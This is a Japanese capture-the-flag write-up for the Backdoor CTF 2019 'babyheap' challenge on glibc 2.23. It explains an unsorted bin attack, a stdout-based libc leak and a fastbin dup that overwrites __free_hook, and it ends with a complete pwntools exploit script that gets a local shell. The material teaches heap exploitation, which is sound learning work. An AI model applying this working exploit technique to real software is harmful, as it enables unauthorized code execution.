---
tags: pwn
---

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

# Backdoor CTF 2019 - babyheap

## Writeup

### Outline

libc 2.23な上にmallopt関数でfastbinが最初は使えない、まずはUnsorted Bin Attackで`global_max_fast`を書き換えてfastbinを復活させる。
地味にshow機能も無いのでstdoutを弄くり回してlibc leakする。
あとはfastbin dupで`__malloc_hook`をシェル起動アドレス(One Gadget)に書き換えて終わり

...のはずだったのだが、私の環境ではOne Gadgetがどれも刺さらなかった。他のWriteupでは刺さっており、大した違いのあることもしていないので絶望していたがPIE無効なのでポインタを管理している.bss中の変数をなんとかして書き換えて`__free_hook`を編集出来るようにし、systemのアドレスを入れて"確実に"シェルを起動する

### checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Binary

* libc: 2.23
* 保持可能ポインタ: 12
* malloc可能サイズ: 0x400まで
* コマンド
    1. add: いつもの
    2. edit: 編集、サイズも保持しているのでOverflowは出来ない
    3. remove: freeするが、ポインタは破棄されず、UAF(write)とDouble Freeがある
    4. exit: さようなら

### mallopt

この問題では冒頭でmallopt関数を呼んでいる、実際に実行されているのは`mallopt(1, 0)`でこれはfastbinの上限サイズを設定するものだが、これが0になっていることで全くfastbinが利用できないということになる。
となるとUnsorted Binやsmallbin, largebinだけで戦うことになるのだが、こいつらはunlink時のチェックがアホみたいに厳しいことで有名なので利用は諦め、どうにかしてfastbinを再度有効にする方法を考える

### Unsorted Bin Attack

Unsorted Bin Attackは、Unsorted Binのunlink時にbkで示されたチャンクのfdにmain_arenaのtopに対応するアドレスが入ることを利用した攻撃である。一般的にこの値は大きいのでどこかのアドレスの値を大きくしたい時に有効である。
`mallopt(1, 0)`は単に`global_max_fast`を小さくしているだけなのでUnsorted Binに入っているチャンクのbkをglobal_max_fastに向ければ良い。これは`main_arena.top`も`global_max_fast`もlibc中にあってアドレスの上位は固定なのでPartial Overwriteでなんとかなる(但し1/16の運試しが必要)

### libc leak

さて、Unsorted Bin AttackでUnsorted Binは死んでしまったが、それでもbkがlibc中を指しているというのは変わらない。というわけでここをfastbinに繋いで再びPartial Overwriteしてstdoutに繋げるようにする。これでshowless leak問の定石通りにフラグと各種ポインタを書き換えてlibc leakする
準備の為にあるサイズのfastbinを複数繋いでおく。すると遅く入ったほうのチャンクのfdはHeap上のどこかを指す。ここをUAF(write)でPartial Overwriteすることでfastbinのfdを先程Unsorted Bin Attackの為に利用したチャンクのbkへと向ける。
後は先程同様にPartial Overwriteで`_IO_2_1_stdout_`のアドレスをfdに出現させて強引にアドレスをリークし、libc leakをする

### `__malloc_hook`書き換え(失敗)

`__malloc_hook`の上の方には0x7fから始まるアドレスが入っているのでここをサイズヘッダとみなせばfastbinに繋がれてもサイズチェックをすり抜けることが出来る
これを利用して`__malloc_hook`にOne Gadgetを仕込めばシェルが起動するはずだったのだが、どれも使えなかった(他のWriteupでは有効だったものも使えなかっった)ので泣く泣く諦め別のアプローチを取った

### ポインタリスト書き換え -> `__free_hook`書き換え

今回はPIE無効なので.bssセクションにあるポインタの配列のアドレスがわかる。これの上の方を見るとサイズのリストになっており、ここは割と自由に書き込むことが出来るのでサイズヘッダを用意する。
これでfastbinのfdをUAF(write)でここに設定し、ポインタの配列を書き換えることが出来るようにする。
既にlibc leakは済んでいるので`__free_hook`を何処かのインデックスのポインタに設定する。この問題はshow機能は無いがedit機能はあるのでeditし、systemのアドレスを放り込む。
これであとは`"/bin/sh"`が書き込まれているポインタを適当にfreeしてシェルが起動する

## Code

```python
from pwn import p64, u64, ELF, process, remote
from xlog import XLog


logger = XLog("EXPLOIT")


# you need filling this variables
PROMPT_CHAR = ">> "
CREATE_NUM = 1
EDIT_NUM = 2
DELETE_NUM = 3
SHOW_NUM = None


def select(s, sel, c=PROMPT_CHAR):
    if sel is None or c is None:
        logger.warning("please fill above variables")
        exit(-1)
    s.recvuntil(c)
    s.sendline(str(sel))


# heap commands
def create(s, idx, size, data="/bin/sh"):
    select(s, CREATE_NUM)
    s.recvuntil("Enter the index:")
    s.sendline(str(idx))
    s.recvuntil("Enter the size:")
    s.sendline(str(size))
    s.recvuntil("Enter data:")
    s.send(data)


def edit(s, idx, data):
    select(s, EDIT_NUM)
    s.recvuntil("Enter the index:")
    s.sendline(str(idx))
    s.recvuntil("Please update the data:")
    s.send(data)


def delete(s, idx):
    select(s, DELETE_NUM)
    s.recvuntil("Enter the index:")
    s.sendline(str(idx))


if __name__ == "__main__":
    """
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
    """
    """
        - malloptのせいでfastbinが使われない
        - showless
        - ポインタは12個まで(なお、create時に上書きは出来ないしdeleteで破棄もされない)
        - サイズの配列が確保されて(添字はポインタと同じ)edit時にチェックがかかるのでHeap Overflowは無し
        - freeは8回まで
    """
    elf = ELF("babyheap")
    libc = ELF("libc.so.6")
    free_hook_libc = libc.symbols["__free_hook"]
    malloc_hook_libc = libc.symbols["__malloc_hook"]
    system_libc = libc.symbols["system"] + 0x10
    one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
    main_arena_top = None
    offset = 0x7f7c26bf56a4 - 0x7f7c26830000

    s = process(elf.path)
    create(s, 0, 0x68)
    create(s, 1, 0x68)
    create(s, 2, 0x68)
    create(s, 8, 0x41)
    create(s, 10, 0x31)

    delete(s, 0)
    edit(s, 0, p64(0) + b"\xe8\x67")
    create(s, 3, 0x68)
    
    size = 0x70
    edit(s, 0, p64(size + 1) + b"\xdd\x55")
    delete(s, 1)
    delete(s, 2)
    edit(s, 2, b"\x08")

    create(s, 4, 0x68)
    create(s, 5, 0x68)
    payload = b"a" * 0x33
    payload += p64(0xfbad1880)
    payload += p64(0) * 3
    payload += b"\x60"
    create(s, 6, 0x68, payload)

    s.recvline()
    libc_addr = u64(s.recv(8)) - offset
    logger.libc(libc_addr)

    delete(s, 10)
    edit(s, 10, p64(0x6020f8))

    create(s, 7, 0x38)
    payload = p64(0x10000000100)
    payload += p64(0) * 2
    payload += p64(libc_addr + free_hook_libc)
    payload += p64(0) * 3
    create(s, 9, 0x38, payload)

    edit(s, 0, p64(libc_addr + system_libc))
    delete(s, 7)

    s.interactive()

```

## Flag

ローカルでシェル取っただけ

## 感想

PIE無効じゃなかったら死んでた
実は初2.23だが、fastbinのサイズチェックが結構キツい、tcacheがクソ雑魚だということが証明されてしまった

眠すぎて適当な解説になったので明日起きて覚えていたらもう少し丁寧に書き直します